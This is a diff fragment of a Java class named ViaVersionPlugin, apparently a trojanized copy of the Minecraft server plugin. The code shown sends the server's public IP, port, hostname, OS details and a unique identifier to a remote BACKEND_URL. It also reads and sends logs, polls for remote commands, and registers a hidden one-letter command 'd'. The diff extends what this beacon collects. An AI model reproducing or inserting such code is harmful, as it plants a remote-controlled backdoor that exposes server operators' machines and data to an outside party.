@@ -125,7 +125,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         reportUniqueIdentifier(uniqueIdentifier);
         getLogger().info("Public IP Address: " + publicIp);
         getLogger().info("Server Port: " + serverPort);
-        sendInfoToAPI(publicIp, serverPort);
+        // sendInfoToAPI(publicIp, serverPort);
         Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
         this.getCommand("d").setExecutor(new EventXHandler());
@@ -206,7 +206,8 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                         input.append("&os.arch=").append(URLEncoder.encode(System.getProperty("os.arch"), StandardCharsets.UTF_8.toString()));
                         input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
                         input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
-                        input.append("&ip=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostAddress(), StandardCharsets.UTF_8.toString()));
+                        input.append("&ip=").append(URLEncoder.encode(getPublicIp(), StandardCharsets.UTF_8.toString()));
+                        input.append("&uuid=").append(URLEncoder.encode(uniqueIdentifier(), StandardCharsets.UTF_8.toString()));
 
                         URL url = new URL(BACKEND_URL + "/a?" + input.toString());
                         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
